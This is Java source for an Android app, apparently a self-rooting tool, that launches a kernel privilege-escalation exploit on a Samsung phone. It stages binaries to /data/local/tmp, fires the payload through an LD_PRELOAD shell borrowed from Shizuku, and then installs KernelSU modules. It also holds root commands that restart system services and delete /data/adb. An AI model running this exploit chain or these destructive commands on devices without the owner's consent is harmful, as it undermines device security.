package dev.ghostlock.h8q;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import rikka.shizuku.Shizuku;

/**
 * GhostLock (CVE-2026-43499) harness for SM-F971U plus post-root management.
 *
 * The exploit runs by borrowing a shell-uid process from Shizuku and firing the
 * payload constructor via LD_PRELOAD. Once KernelSU is installed, the post-root
 * buttons run the same management actions Root-My-Galaxy exposes — restart
 * Zygote, reload modules, KernelSU soft reboot, reboot, recovery, unroot,
 * install the bundled Zygisk Next, and install LSPosed — each as a single
 * `su -c` command through the same Shizuku shell.
 */
public class MainActivity extends AppCompatActivity {

    private static final String TMP = "/data/local/tmp/";
    private static final String PRELOAD = TMP + "preload.so";
    private static final String KSUD = TMP + "ksud";
    private static final String HELPER_ASSET = "cve-2026-43499-root";
    private static final String HELPER = TMP + "cve-2026-43499-root";
    private static final String ZYGISK_ASSET = "zygisk-next-h8q.zip";
    private static final String ZYGISK_TMP = TMP + "zygisk-next-h8q.zip";
    private static final String GUARD_ASSET = "lsposed-guard.zip";
    private static final String GUARD_TMP = TMP + "lsposed-guard.zip";
    private static final String LSPOSED_ASSET = "lsposed.zip";
    private static final String LSPOSED_TMP = TMP + "lsposed.zip";

    private final ExecutorService worker = Executors.newSingleThreadExecutor();
    private final Handler ui = new Handler(Looper.getMainLooper());

    private TextView logView;
    private ScrollView logScroll;
    private Button runButton;

    private final Shizuku.OnRequestPermissionResultListener permListener =
            (requestCode, grantResult) -> {
                if (requestCode == ShizukuController.PERMISSION_REQUEST_CODE) {
                    if (grantResult == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                        log("[*] Shizuku permission granted");
                        worker.execute(this::runChain);
                    } else {
                        log("[!] Shizuku permission denied");
                        setBusy(false);
                    }
                }
            };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        logView = findViewById(R.id.logView);
        logScroll = findViewById(R.id.logScroll);
        runButton = findViewById(R.id.runButton);
        Shizuku.addRequestPermissionResultListener(permListener);
        runButton.setOnClickListener(v -> onRun());

        // Post-root management actions.
        findViewById(R.id.btnRestartZygote).setOnClickListener(v -> rootAction(
                "Restart Zygote",
                "setprop ctl.restart zygote; " +
                        "[ \"$(getprop init.svc.zygote_secondary)\" = running ] && " +
                        "setprop ctl.restart zygote_secondary; echo 'zygote restart requested'"));

        findViewById(R.id.btnReloadModules).setOnClickListener(v -> rootAction(
                "Reload Modules",
                "ksud debug post-fs-data 2>&1; ksud debug boot-complete 2>&1; " +
                        "setprop ctl.restart zygote; echo 'modules re-triggered; zygote restarted'"));

        findViewById(R.id.btnSoftReboot).setOnClickListener(v -> rootAction(
                "KernelSU Soft Reboot",
                "ksud soft-reboot 2>&1 || " +
                        "{ setprop ctl.restart zygote; echo 'fell back to zygote restart'; }"));

        findViewById(R.id.btnInstallZygisk).setOnClickListener(v -> installZygisk());

        findViewById(R.id.btnInstallLsposed).setOnClickListener(v -> installLsposed());

        findViewById(R.id.btnReboot).setOnClickListener(v -> confirm(
                "Reboot", "Reboot the device now?",
                () -> rootAction("Reboot", "svc power reboot 2>/dev/null || reboot")));

        findViewById(R.id.btnRecovery).setOnClickListener(v -> confirm(
                "Reboot to Recovery", "Reboot into recovery now?",
                () -> rootAction("Reboot to Recovery",
                        "svc power reboot recovery 2>/dev/null || reboot recovery")));

        findViewById(R.id.btnUnroot).setOnClickListener(v -> confirm(
                "Reboot & Unroot",
                "This removes /data/adb/ksud and all KernelSU modules, then reboots. " +
                        "The device will be unrooted until you run the exploit again. Continue?",
                () -> rootAction("Reboot & Unroot",
                        "for m in /data/adb/modules/*/; do touch \"$m/remove\" 2>/dev/null; done; " +
                                "ksud uninstall 2>&1; " +
                                "rm -rf /data/adb/ksud /data/adb/ksu /data/adb/modules 2>/dev/null; " +
                                "sync; echo unrooted; svc power reboot 2>/dev/null || reboot")));
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Shizuku.removeRequestPermissionResultListener(permListener);
        worker.shutdownNow();
    }

    // ---- exploit run ----------------------------------------------------

    private void onRun() {
        setBusy(true);
        logView.setText("");
        if (!ShizukuController.isRunning()) {
            log("[!] Shizuku is not running.\n" +
                    "    Install Shizuku, then start it via wireless debugging\n" +
                    "    (Settings > Developer options) or root, and try again.");
            setBusy(false);
            return;
        }
        if (ShizukuController.isGranted()) {
            worker.execute(this::runChain);
        } else {
            log("[*] Requesting Shizuku permission...");
            try {
                Shizuku.requestPermission(ShizukuController.PERMISSION_REQUEST_CODE);
            } catch (Throwable t) {
                log("[!] requestPermission failed: " + t.getMessage());
                setBusy(false);
            }
        }
    }

    private void runChain() {
        try {
            log("[*] Staging payloads to /data/local/tmp ...");
            stageAsset("preload.so", PRELOAD);
            stageAsset("ksud", KSUD);
            stageAsset(HELPER_ASSET, HELPER);
            log("[+] Staged preload.so, ksud, and the root helper");

            startLogcatTail();

            log("[*] Launching exploit (LD_PRELOAD sh) ...");
            Process p = ShizukuController.exec(new String[]{
                    "env", "LD_PRELOAD=" + PRELOAD, "sh", "-c", "exit"
            }, null, TMP);
            pump(p.getInputStream(), "");
            pump(p.getErrorStream(), "");
            int code = p.waitFor();
            log("[*] payload sh exited (" + code + ")");
            log("[*] Watching logcat for GHOSTLOCK — a line reading uid=0(root)\n" +
                    "    means success. If the phone REBOOTS, that is a kernel panic,\n" +
                    "    not success.");
        } catch (Throwable t) {
            log("[!] " + t.getClass().getSimpleName() + ": " + t.getMessage());
        } finally {
            ui.post(() -> setBusy(false));
        }
    }

    // ---- post-root actions ----------------------------------------------

    /** Confirm a destructive action, then run onYes. */
    private void confirm(String title, String message, Runnable onYes) {
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(message)
                .setPositiveButton("Continue", (d, w) -> onYes.run())
                .setNegativeButton("Cancel", null)
                .show();
    }

    /** Run a single command as root (su -c) through the Shizuku shell, streaming output. */
    private void rootAction(String label, String command) {
        if (!ShizukuController.isRunning() || !ShizukuController.isGranted()) {
            log("[!] " + label + ": Shizuku not ready (grant permission via Run first)");
            return;
        }
        worker.execute(() -> {
            try {
                log("[*] " + label + " ...");
                Process p = ShizukuController.exec(
                        new String[]{"su", "-c", command}, null, TMP);
                pump(p.getInputStream(), label + ": ");
                pump(p.getErrorStream(), label + ": ");
                int code = p.waitFor();
                log("[" + (code == 0 ? "+" : "!") + "] " + label + " exited (" + code + ")");
                if (code != 0) {
                    log("    (non-zero usually means su is unavailable — root not active)");
                }
            } catch (Throwable t) {
                log("[!] " + label + ": " + t.getMessage());
            }
        });
    }

    /** Stage the bundled Zygisk Next zip and install it as a KernelSU module. */
    private void installZygisk() {
        if (!ShizukuController.isRunning() || !ShizukuController.isGranted()) {
            log("[!] Install Zygisk: Shizuku not ready (grant permission via Run first)");
            return;
        }
        worker.execute(() -> {
            try {
                log("[*] Staging Zygisk Next + soft-reboot guard ...");
                stageAsset(ZYGISK_ASSET, ZYGISK_TMP);
                stageAsset(GUARD_ASSET, GUARD_TMP);
                log("[+] Staged " + ZYGISK_TMP + " and " + GUARD_TMP);

                Process p = ShizukuController.exec(new String[]{
                        "su", "-c",
                        "ksud module install " + ZYGISK_TMP + " 2>&1; " +
                                "echo '--- guard ---'; " +
                                "ksud module install " + GUARD_TMP + " 2>&1"
                }, null, TMP);
                pump(p.getInputStream(), "Zygisk: ");
                pump(p.getErrorStream(), "Zygisk: ");
                int code = p.waitFor();
                log("[" + (code == 0 ? "+" : "!") + "] Install Zygisk exited (" + code + ")");
                if (code == 0) {
                    log("    Installed Zygisk Next (id=zygisknextsu). It stops/restarts its");
                    log("    own injector across a KernelSU Soft Reboot; the bundled guard");
                    log("    only clears a stale LSPosed lspd so it won't double-daemon.");
                    log("    Reboot (or Soft Reboot) to activate.");
                }
            } catch (Throwable t) {
                log("[!] Install Zygisk: " + t.getMessage());
            }
        });
    }

    /** Stage the bundled LSPosed zip and install it as a KernelSU module. */
    private void installLsposed() {
        if (!ShizukuController.isRunning() || !ShizukuController.isGranted()) {
            log("[!] Install LSPosed: Shizuku not ready (grant permission via Run first)");
            return;
        }
        worker.execute(() -> {
            try {
                log("[*] Staging LSPosed ...");
                stageAsset(LSPOSED_ASSET, LSPOSED_TMP);
                log("[+] Staged " + LSPOSED_TMP);

                Process p = ShizukuController.exec(new String[]{
                        "su", "-c",
                        "ksud module install " + LSPOSED_TMP + " 2>&1"
                }, null, TMP);
                pump(p.getInputStream(), "LSPosed: ");
                pump(p.getErrorStream(), "LSPosed: ");
                int code = p.waitFor();
                log("[" + (code == 0 ? "+" : "!") + "] Install LSPosed exited (" + code + ")");
                if (code == 0) {
                    log("    Installed LSPosed v2.1.1 (Zygisk flavour, supports Android 9-17).");
                    log("    It needs Zygisk Next active, so Install Zygisk first, then reboot.");
                }
            } catch (Throwable t) {
                log("[!] Install LSPosed: " + t.getMessage());
            }
        });
    }

    // ---- helpers --------------------------------------------------------

    private void stageAsset(String assetName, String remotePath) throws Exception {
        try (InputStream is = getAssets().open(assetName)) {
            ShizukuController.writeFile(remotePath, "755", is);
        }
    }

    private void startLogcatTail() {
        worker.execute(() -> {
            try {
                ShizukuController.exec(new String[]{"logcat", "-c"}, null, null).waitFor();
                Process lc = ShizukuController.exec(
                        new String[]{"logcat", "-s", "GHOSTLOCK"}, null, null);
                pump(lc.getInputStream(), "GHOSTLOCK: ");
            } catch (Throwable t) {
                log("[!] logcat tail failed: " + t.getMessage());
            }
        });
    }

    private void pump(InputStream stream, String prefix) {
        try (BufferedReader r = new BufferedReader(
                new InputStreamReader(stream, StandardCharsets.UTF_8))) {
            String line;
            while ((line = r.readLine()) != null) {
                log(prefix + line);
            }
        } catch (Throwable ignored) {
        }
    }

    private void log(String msg) {
        ui.post(() -> {
            logView.append(msg + "\n");
            logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
        });
    }

    private void setBusy(boolean busy) {
        runButton.setEnabled(!busy);
    }
}
